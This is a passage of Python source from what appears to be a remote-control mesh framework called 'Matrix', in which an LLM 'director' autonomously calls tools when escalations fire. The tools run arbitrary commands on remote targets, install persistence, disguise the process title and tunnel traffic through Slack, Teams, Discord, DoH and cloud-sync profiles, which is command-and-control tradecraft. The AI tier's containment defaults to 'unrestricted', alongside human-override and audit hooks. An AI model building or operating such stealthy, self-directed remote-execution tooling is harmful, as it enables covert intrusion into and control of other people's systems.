        return {"target": target_address, "success": ok}

    def _run_remote_task(self, target_address: str, command: str,
                         timeout: int = 60, transport: str = "auto") -> dict:
        if not self._node:
            raise DirectorError("No JumpNode available")
        target = self._resolve_device(target_address)
        backend = self._build_backend(target, transport) if transport != "auto" else None
        result = self._node.run_task(
            target=target,
            command=command,
            timeout=timeout,
            backend=backend,
        )
        return {
            "target": target_address,
            "command": command,
            "exit_code": result.get("exit_code"),
            "output": result.get("output", "")[:2000],
            "error": result.get("error"),
        }

    def _enable_persistence(self, mechanism: str, command: str = "matrix listen") -> dict:
        pm = PersistenceManager(command=command.split())
        result = pm.enable([mechanism])[0]
        return {"mechanism": result.mechanism, "enabled": result.enabled, "details": result.details}

    def _disable_persistence(self, mechanism: str) -> dict:
        pm = PersistenceManager(command=["matrix", "listen"])
        result = pm.disable([mechanism])[0]
        return {"mechanism": result.mechanism, "enabled": result.enabled, "details": result.details}

    def _apply_disguise(self, title: str) -> dict:
        from matrix.disguise import ProcessDisguise
        d = ProcessDisguise(title=title)
        return {"title": title, "applied": d.apply()}

    def _set_transport_profile(self, profile: str) -> dict:
        if not self._node:
            raise DirectorError("No JumpNode available")
        profile_map = {
            "plain": lambda: None,
            "cloud_sync": CloudSyncProfile,
            "web_api": WebAPIProfile,
            "slack": SlackProfile,
            "teams": TeamsProfile,
            "discord": DiscordProfile,
            "doh": DoHProfile,
            "grpc": GrpcProfile,
        }
        cls = profile_map.get(profile)
        if cls is None:
            raise DirectorError(f"Unknown profile: {profile}")
        # Store preference on the node for future normalized connections
        self._node._director_profile = profile
        self._node._director_profile_factory = cls
        return {"profile": profile, "applied": True}

    def _submit_relay_task(self, destination_id: str, payload_type: str, payload: str) -> dict:
        import base64
        if not self._node_mgr:
            raise DirectorError("No NodeManager available")
        from matrix.task_relay import RelayMessage
        msg = RelayMessage(
            message_id=uuid.uuid4().hex,
            source_id=self._node.discovery.node_id if self._node else "director",
            destination_id=destination_id,
            payload_type=payload_type,
            payload=base64.b64decode(payload),
            ttl=10,
            hop_path=[],
            timestamp=time.time(),
        )
        if self._node and hasattr(self._node, "_task_relay") and self._node._task_relay:
            self._node._task_relay.submit(msg)
            return {"message_id": msg.message_id, "submitted": True}
        raise DirectorError("No task relay available")

    def _sync_data(self, peer_id: str) -> dict:
        if not self._sync_mgr:
            raise DirectorError("No SyncManager available")
        return {"peer_id": peer_id, "triggered": True}


# ── Tri-State Director ──────────────────────────────────────────────────────


class TriStateDirector:
    """Orchestrates three tiers of authority for the Matrix mesh.

    Thread-safe.  Integrates with AutonomousLoop via on_tick callback.

    Usage::

        director = TriStateDirector(
            loop=autonomous_loop,
            node=jump_node,
            multipath=multi_path_conn,
            node_mgr=node_manager,
        )
        director.start()
        # ... system runs ...
        director.human_override()     # CLI command
        director.release_override()   # give back to autonomous
        director.stop()
    """

    def __init__(
        self,
        loop: Any,
        *,
        node: Any = None,
        multipath: Any = None,
        node_mgr: Any = None,
        rbac: Any = None,
        sync_mgr: Any = None,
        terminator: Any = None,
        llm_backend: Optional[LLMBackend] = None,
        config: Any = None,
        policy: Optional[ContainmentPolicy] = None,
    ):
        cfg = config or _config

        # Containment policy bounds the AI tier (see ContainmentPolicy).
        self._policy = policy or ContainmentPolicy.from_name(
            getattr(cfg, "director_containment", "unrestricted")
        )

        self._loop = loop
        self._node = node
        self._multipath = multipath
        self._node_mgr = node_mgr
        self._rbac = rbac
        self._sync_mgr = sync_mgr
        self._terminator = terminator

        # ── State machine ────────────────────────────────────────────────
        self._state = DirectorState.AUTONOMOUS
        self._state_lock = threading.RLock()
        self._state_changed = threading.Event()

        # ── LLM ──────────────────────────────────────────────────────────
        self._llm = llm_backend or create_backend(cfg)
        self._action_budget = cfg.llm_action_budget
        self._llm_timeout = cfg.llm_timeout

        # ── Escalation detector ──────────────────────────────────────────
        self._detector = EscalationDetector(
            cooldown_s=cfg.director_escalation_cooldown,
            degraded_sustain_s=cfg.director_degraded_sustain_s,
            task_failure_window_s=cfg.director_task_failure_window,
            task_failure_threshold=cfg.director_task_failure_threshold,
        )
        self._detector.attach(
            resilience=getattr(loop, "resilience", None),
            multipath=multipath,
            node_mgr=node_mgr,
            on_escalation=self._on_escalation,
        )

        # Wire ResilienceManager exhaustion hook → detector
        resilience = getattr(loop, "resilience", None)
        if resilience and hasattr(resilience, "set_on_exhausted"):
            resilience.set_on_exhausted(self._on_resilience_exhausted)

        # ── RBAC identity for the director ───────────────────────────────
        self._auth_token: str = ""
        if rbac:
            try:
                from matrix.rbac import Role, Permission
                self._auth_token = uuid.uuid4().hex
                rbac.register_identity(
                    node_id="local",
                    role=Role.OPERATOR,
                    auth_token=self._auth_token,
                    custom_permissions=frozenset({
                        Permission.JUMP,
                        Permission.DISCOVER,
                        Permission.UPGRADE,
                        Permission.SYNC_DATA,
                        Permission.RELAY,
                        Permission.TERMINATE,
                        Permission.VIEW_STATUS,
                    }),
                )
            except Exception:
                logger.debug("Director RBAC registration failed", exc_info=True)

        # ── Tool executor ────────────────────────────────────────────────
        self._executor = ToolExecutor(
            node=node,
            multipath=multipath,
            node_mgr=node_mgr,
            upgrader=getattr(loop, "upgrader", None),
            sync_mgr=sync_mgr,
            terminator=terminator,
            rbac=rbac,
            auth_token=self._auth_token,
            policy=self._policy,
        )

        # ── Audit log ────────────────────────────────────────────────────
        self._audit_lock = threading.Lock()
        self._audit_log: List[AuditEntry] = []

        # ── Goal / plan memory ───────────────────────────────────────────
        self._plan_memory = PlanMemory()
        self._active_goal: Optional[DirectorGoal] = None

        # ── Escalation queue ─────────────────────────────────────────────
        self._escalation_queue: List[EscalationEvent] = []
        self._escalation_lock = threading.Lock()
        self._escalation_thread: Optional[threading.Thread] = None
        self._running = False

        # ── Human override latch ─────────────────────────────────────────
        self._human_override_active = threading.Event()

    # ── Lifecycle ────────────────────────────────────────────────────────

    def start(self) -> None:
        """Start the director.  Registers as an AutonomousLoop tick callback."""
        self._running = True
        if hasattr(self._loop, "add_on_tick"):
            self._loop.add_on_tick(self._on_tick)
        self._escalation_thread = threading.Thread(
            target=self._escalation_worker,
            daemon=True,
            name="director-escalation",
        )
        self._escalation_thread.start()
        logger.info("TriStateDirector: started in AUTONOMOUS state "
                    "(containment=%s)", self._policy.mode)

    def stop(self) -> None:
        """Stop the director."""
        self._running = False
        self._state_changed.set()
        if self._escalation_thread:
            self._escalation_thread.join(timeout=5.0)
        logger.info("TriStateDirector: stopped")

    # ── State Transitions ────────────────────────────────────────────────

    @property
    def state(self) -> DirectorState:
        with self._state_lock:
            return self._state

    def _transition(
        self,
        new_state: DirectorState,
        reason: str,
        details: Optional[dict] = None,
    ) -> None:
        """Atomic state transition with audit logging."""
        with self._state_lock:
            old = self._state
            if old == new_state:
                return
            self._state = new_state
            self._audit(
                "transition",
                old.value,
                new_state.value,
                {"reason": reason, **(details or {})},
            )
            logger.info(
                "Director: %s -> %s (%s)", old.value, new_state.value, reason
            )
            self._state_changed.set()

    def human_override(self, operator_id: str = "cli") -> None:
        """Tier 1: Human takes direct control.  Interrupts ANY state."""
        with self._state_lock:
            old = self._state
            self._state = DirectorState.HUMAN_OVERRIDE
            self._human_override_active.set()
        self._audit(
            "human_override",
            old.value,
            "human_override",
            {"operator": operator_id},
        )
        logger.warning("Director: HUMAN OVERRIDE activated by %s", operator_id)

    def release_override(self, operator_id: str = "cli") -> None:
        """Release human override, return to AUTONOMOUS."""
        with self._state_lock:
            if self._state != DirectorState.HUMAN_OVERRIDE:
                raise DirectorError("Not in HUMAN_OVERRIDE state")
            self._state = DirectorState.AUTONOMOUS
            self._human_override_active.clear()
        self._audit(
            "transition",
            "human_override",
            "autonomous",
            {"reason": "human_release", "operator": operator_id},
        )
        logger.info("Director: Human override released, returning to AUTONOMOUS")

    def manual_escalate(self, reason: str = "") -> None:
        """Manually trigger an AI escalation (e.g. from CLI)."""
        event = EscalationEvent(
            event_id=uuid.uuid4().hex,
            trigger=EscalationTrigger.MANUAL_ESCALATE,
            timestamp=time.time(),
            details={"reason": reason},
        )
        self._on_escalation(event)

    # ── Tick Callback ────────────────────────────────────────────────────

    def _on_tick(self, loop: Any) -> None:
        """Called by AutonomousLoop each tick.  Only detects in AUTONOMOUS."""
        with self._state_lock:
            if self._state != DirectorState.AUTONOMOUS:
                return
        self._detector.check(loop)

    def _on_escalation(self, event: EscalationEvent) -> None:
        """Callback from EscalationDetector when a trigger fires."""
        with self._state_lock:
            if self._state != DirectorState.AUTONOMOUS:
                logger.info(
                    "Director: escalation %s suppressed (state=%s)",
                    event.trigger.value,
                    self._state.value,
                )
                return
        with self._escalation_lock:
            self._escalation_queue.append(event)
        self._state_changed.set()

    def _on_resilience_exhausted(self, slot_name: str, failure_count: int) -> None:
        """Hook from ResilienceManager when all fallbacks are exhausted."""
        event = EscalationEvent(
            event_id=uuid.uuid4().hex,
            trigger=EscalationTrigger.FALLBACKS_EXHAUSTED,
            timestamp=time.time(),
            details={"slot_name": slot_name, "failure_count": failure_count},
        )
        self._on_escalation(event)

    # ── Escalation Worker ────────────────────────────────────────────────

    def _escalation_worker(self) -> None:
        """Background thread that processes escalation events."""
        while self._running:
            self._state_changed.wait(timeout=1.0)
            self._state_changed.clear()

            if not self._running:
                break

            with self._escalation_lock:
                events = list(self._escalation_queue)
                self._escalation_queue.clear()

            for i, event in enumerate(events):
                with self._state_lock:
                    if self._state != DirectorState.AUTONOMOUS:
                        with self._escalation_lock:
                            self._escalation_queue.extend(events[i:])
                        break
                self._handle_escalation(event)

    def _handle_escalation(self, event: EscalationEvent) -> None:
        """Process a single escalation: AI_ACTIVE → tool execution → AUTONOMOUS."""

        # Containment: a disabled AI tier never invokes the LLM or runs tools.
        if not self._policy.invoke_llm:
            self._audit(
                "containment_blocked",
                self._state.value,
                self._state.value,
                {
                    "trigger": event.trigger.value,
                    "mode": self._policy.mode,
                    "note": "AI tier disabled by containment policy",
                },
            )
            logger.info(
                "Director: escalation %s not actioned (containment=%s)",
                event.trigger.value, self._policy.mode,
            )
            return

        # 1. Transition to AI_ACTIVE
        self._transition(
            DirectorState.AI_ACTIVE,
            f"escalation:{event.trigger.value}",
            event.details,
        )

        # 2. Build Semantic Delta
        delta = self._build_semantic_delta(event)

        # 3. Observe-decide-act loop with tool-result feedback
        upgrade_versions: List[Optional[int]] = []
        goal = self._active_goal
        try:
            # Prime the loop.  If we have an active goal, include it in the prompt.
            user_message = self._build_loop_message(delta, goal)
            turn = 0
            while turn < self._action_budget:
                if self._human_override_active.is_set():
                    logger.warning("Director: human override during AI action, aborting")
                    self._rollback_ai_upgrades(upgrade_versions)
                    return

                response = self._invoke_llm_with_message(user_message)

                if not self._policy.execute_tools:
                    for tool_call in response.tool_calls:
                        self._audit("recommendation", "ai_active", "ai_active", {
                            "tool": tool_call.tool_name,
                            "arguments": tool_call.arguments,
                            "executed": False,
                            "mode": self._policy.mode,
                        })
                    logger.info("Director: advisory mode recorded %d recommendation(s)",
                                len(response.tool_calls))
                    return

                if not response.tool_calls:
                    logger.info("Director: LLM chose no further actions")
                    if goal:
                        goal.status = "complete"
                        goal.completed_at = time.time()
                        self._plan_memory.update(goal)
                        self._active_goal = None
                    break

                # Execute only the first tool call per turn so we can observe its result.
                tool_call = response.tool_calls[0]
                result = self._executor.execute(tool_call)
                turn += 1

                self._audit("tool_call", "ai_active", "ai_active", {
                    "tool": result.tool_name,
                    "arguments": result.arguments,
                    "success": result.success,
                    "result": str(result.result)[:500] if result.result else None,
                    "error": result.error,
                    "duration_ms": round(result.duration_ms, 2),
                })

                if goal:
                    goal.actions_taken += 1
                    goal.results.append({
                        "tool": result.tool_name,
                        "success": result.success,
                        "result": result.result,
                        "error": result.error,
                    })
                    self._plan_memory.update(goal)

                if result.tool_name == "propose_hot_upgrade" and result.success:
                    upgrade_versions.append(
                        result.result.get("version") if isinstance(result.result, dict) else None
                    )
                if result.tool_name == "propose_hot_upgrade" and not result.success:
                    logger.error("Director: upgrade failed (%s), rolling back", result.error)
                    self._rollback_ai_upgrades(upgrade_versions)
                    break

                # Feed the result back as the next user message.
                user_message = self._build_loop_message(delta, goal, result=result)

        except LLMError as exc:
            self._audit("llm_error", "ai_active", "autonomous", {"error": str(exc)})
            logger.error("Director: LLM failed (%s), returning to AUTONOMOUS", exc)
            if goal:
                goal.status = "failed"
                self._plan_memory.update(goal)
                self._active_goal = None

        except Exception as exc:
            logger.exception("Director: unexpected error during AI action")
            self._rollback_ai_upgrades(upgrade_versions)
            self._audit("llm_error", "ai_active", "autonomous", {"error": f"unexpected: {exc}"})
            if goal:
                goal.status = "failed"
                self._plan_memory.update(goal)
                self._active_goal = None

        finally:
            with self._state_lock:
                if self._state == DirectorState.AI_ACTIVE:
                    self._transition(DirectorState.AUTONOMOUS, "ai_action_complete")

    def _rollback_ai_upgrades(self, versions: List[Optional[int]]) -> None:
        """Roll back any upgrades applied during this escalation."""
        upgrader = getattr(self._loop, "upgrader", None)
        if not upgrader:
            return
        for version in reversed(versions):
            if version is not None:
                try:
                    upgrader.rollback(version)
                    logger.info(
                        "Director: rolled back AI upgrade version %d", version
                    )
                except Exception:
                    logger.exception(
                        "Director: failed to rollback version %d", version
                    )

    # ── Semantic Delta Assembly ──────────────────────────────────────────

    def _build_transport_probe(self, event: EscalationEvent) -> Optional[dict]:
        """Summarize transport health for the LLM.

        Derived from the MultiPath health snapshot rather than a fresh
        negotiation: a blocking ``TransportNegotiator.negotiate()`` on the
        escalation path is exactly the wrong thing to do while transports are
        already failing (it would stall the AI tier when it is needed most). For
        TRANSPORT_TOTAL_FAILURE the negotiator's own failure context rides along
        on ``event.details``, so we fold that in too.
        """
        probe: Dict[str, Any] = {}
        mp = self._multipath
        if mp is not None and hasattr(mp, "get_health"):
            try:
                health = mp.get_health()
                probe["paths_total"] = len(health)
                probe["paths_healthy"] = sum(
                    1 for h in health.values() if h.get("state") == "healthy"
                )
                probe["all_degraded"] = bool(getattr(mp, "all_degraded", False))
                probe["transports"] = sorted(
                    {h.get("transport") for h in health.values() if h.get("transport")}
                )
            except Exception:
                logger.warning("transport_probe: failed to read multipath health",
                               exc_info=True)
        if event.trigger == EscalationTrigger.TRANSPORT_TOTAL_FAILURE and event.details:
            probe["failure"] = event.details
        return probe or None

    def _build_semantic_delta(self, event: EscalationEvent) -> SemanticDelta:
        """Assemble the complete state snapshot for the LLM."""
        from matrix.autonomous import system_metrics as _system_metrics

        loop_status = self._loop.status if hasattr(self._loop, "status") else {}

        path_health: Dict[str, dict] = {}
        if self._multipath and hasattr(self._multipath, "get_health"):
            path_health = self._multipath.get_health()

        node_health: List[dict] = []
        if self._node_mgr and hasattr(self._node_mgr, "list_nodes"):
            try:
                nodes = self._node_mgr.list_nodes()
            except Exception:
                logger.warning("Failed to list nodes for delta", exc_info=True)
                nodes = []
            for node in nodes:
                # Per-node so one bad node doesn't silently drop the rest.
                try:
                    node_health.append(self._node_mgr.get_node_health(node.node_id))
                except Exception:
                    logger.warning("Failed to collect health for node %s",
                                   getattr(node, "node_id", "?"), exc_info=True)

        recent_failures: List[dict] = []
        if self._node_mgr and hasattr(self._node_mgr, "list_tasks"):
            try:
                from matrix.node_manager import TaskStatus
                failed = self._node_mgr.list_tasks(status=TaskStatus.FAILED)
                for task in sorted(
                    failed,
                    key=lambda t: t.finished_at or 0,
                    reverse=True,
                )[:10]:
                    recent_failures.append(task.to_dict())
            except Exception:
                logger.debug("Failed to collect task failures", exc_info=True)

        adapter_mode = ""
        adapter_metrics: Dict[str, float] = {}
        if hasattr(self._loop, "adapter"):
            adapter_mode = self._loop.adapter.mode
            adapter_metrics = self._loop.adapter.metrics

        sys_metrics: Dict[str, float] = {}
        try:
            sys_metrics = _system_metrics()
        except Exception:
            pass

        delta = SemanticDelta(
            event=event,
            loop_status=loop_status,
            path_health=path_health,
            node_health=node_health,
            recent_task_failures=recent_failures,
            transport_probe=self._build_transport_probe(event),
            adapter_mode=adapter_mode,
            adapter_metrics=adapter_metrics,
            system_metrics=sys_metrics,
            timestamp=time.time(),
        )

        if not SemanticDelta.validate(delta):
            raise DirectorError("Semantic delta validation failed")

        # Trigger-aware evidence check: warn (don't raise) if the trigger's
        # expected evidence is missing — a thin delta during a real incident is
        # still better than dropping the escalation.
        ok, missing = SemanticDelta.validate_for_trigger(delta)
        if not ok:
            logger.warning("delta for %s is missing expected evidence: %s",
                           event.trigger.value, ", ".join(missing))

        return delta

    # ── LLM Invocation ───────────────────────────────────────────────────

    def _invoke_llm(self, delta: SemanticDelta) -> LLMResponse:
        """Single-turn LLM invocation with dead-man's switch timeout."""
        return self._invoke_llm_with_message(self._build_loop_message(delta, self._active_goal))

    def _build_loop_message(self, delta: SemanticDelta, goal: Optional[DirectorGoal] = None,
                          result: Optional[ToolResult] = None) -> str:
        """Assemble the prompt for one observe-decide-act turn."""
        payload: Dict[str, Any] = {
            "escalation": {
                "trigger": delta.event.trigger.value,
                "details": delta.event.details,
            },
            "loop": delta.loop_status,
            "paths": delta.path_health,
            "nodes": delta.node_health,
            "recent_failures": delta.recent_task_failures,
            "transport": delta.transport_probe,
            "adapter": {"mode": delta.adapter_mode, "metrics": delta.adapter_metrics},
            "system": delta.system_metrics,
        }
        if goal:
            payload["goal"] = {
                "goal_id": goal.goal_id,
                "objective": goal.objective,
                "status": goal.status,
                "plan": goal.plan,
                "scratchpad": goal.scratchpad,
                "actions_taken": goal.actions_taken,
                "max_steps": goal.max_steps,
            }
        if result:
            payload["last_tool_result"] = {
                "tool": result.tool_name,
                "success": result.success,
                "result": result.result,
                "error": result.error,
            }
        return json.dumps(payload, indent=2)

    def _invoke_llm_with_message(self, user_message: str) -> LLMResponse:
        system_prompt = DIRECTOR_SYSTEM_PROMPT.format(
            action_budget=self._action_budget,
        )
        tools = ToolExecutor.tool_definitions(self._policy)
        response = self._llm.invoke(
            system_prompt=system_prompt,
            user_message=user_message,
            tools=tools,
            timeout=self._llm_timeout,
        )
        self._audit("llm_response", "ai_active", "ai_active", {
            "tool_calls": len(response.tool_calls),
            "model": response.model,
            "tokens": response.usage_tokens,
            "raw_text_preview": response.raw_text[:200] if response.raw_text else "",
        })
        return response

    # ── Audit ────────────────────────────────────────────────────────────

    def _audit(
        self,
        category: str,
        from_state: str,
        to_state: str,
        details: Optional[dict] = None,
    ) -> None:
        entry = AuditEntry(
            entry_id=uuid.uuid4().hex,
            timestamp=time.time(),
            category=category,
            from_state=from_state,
            to_state=to_state,
            details=details or {},
        )
        with self._audit_lock:
            self._audit_log.append(entry)

    @property
    def audit_log(self) -> List[AuditEntry]:
        with self._audit_lock:
            return list(self._audit_log)

    # ── Status ───────────────────────────────────────────────────────────

    def set_goal(self, objective: str, max_steps: int = 10, source: str = "operator") -> DirectorGoal:
        """Create a new Director goal and mark it active."""
        goal = self._plan_memory.create(objective, max_steps=max_steps, source=source)
        goal.status = "active"
        self._active_goal = goal
        self._plan_memory.update(goal)
        self._audit("goal_set", self._state.value, self._state.value, goal.to_dict())
        logger.info("Director: goal set — %s (id=%s)", objective, goal.goal_id)
        return goal

    def list_goals(self) -> List[dict]:
        """Return all goals as JSON-serializable dicts."""
        return [g.to_dict() for g in self._plan_memory.list_all()]

    def get_goal(self, goal_id: str) -> Optional[dict]:
        goal = self._plan_memory.get(goal_id)
        return goal.to_dict() if goal else None

    @property
    def status(self) -> dict:
        """JSON-serializable status snapshot."""
        with self._state_lock:
            state = self._state.value
        with self._escalation_lock:
            queue_depth = len(self._escalation_queue)
        return {
            "state": state,
            "containment": self._policy.mode,
            "audit_entries": len(self._audit_log),
            "escalation_queue_depth": queue_depth,
            "action_budget": self._action_budget,
            "llm_timeout": self._llm_timeout,
        }
